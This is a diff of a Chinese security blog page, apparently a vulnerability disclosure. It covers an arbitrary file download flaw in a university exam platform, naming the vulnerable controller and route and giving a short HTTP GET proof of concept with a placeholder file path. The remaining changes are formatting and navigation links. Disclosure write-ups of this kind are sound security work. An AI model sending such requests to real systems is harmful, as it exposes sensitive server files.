@@ -78,13 +78,11 @@
       
         <p>某平台系统存在任意文件下载漏洞，攻击者可利用该漏洞下载系统敏感信息，影响范围涉及全国大部分高校，现已修复。</p>
 <p><img src="/img/blog_img/cnvd/cnvd_03.png" alt=""></p>
-<h2 id="漏洞分析">漏洞分析</h2>
-<p>漏洞位于文件 <code>WEB-INF/classes/com/fh/controller/theorytest/student/ExamManage.class</code></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞位于文件 <code>WEB-INF/classes/com/fh/controller/theorytest/student/ExamManage.class</code> </p>
 <p><code>down</code> 方法，路由是 <code>/student/exam/down.do</code></p>
-<p><img src="/img/blog_img/cnvd/cnvd_04.png" alt=""></p>
+<p><img src="/img/blog_img/cnvd/cnvd_04.png" style="zoom:50%;" /></p>
 <p>获取 <code>path</code> 参数，拼接成 <code>realPath</code> ,然后用输出流写出文件。</p>
-<h2 id="漏洞复现">漏洞复现</h2>
-<p>POC</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>POC</p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/student/exam/down.do?path=xxxx（文件路径）</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
 
       
@@ -102,11 +100,11 @@
     
 <nav id="article-nav">
   
-    <a href="../From-The-Very-Beginning/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="../Intro/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Newer</strong>
       <div class="article-nav-title">
         
-          Restart
+          Intro
         
       </div>
     </a>
@@ -159,7 +157,7 @@
           </li>
         
           <li>
-            <a href="../From-The-Very-Beginning/">Restart</a>
+            <a href="../Intro/">Intro</a>
           </li>
         
       </ul>
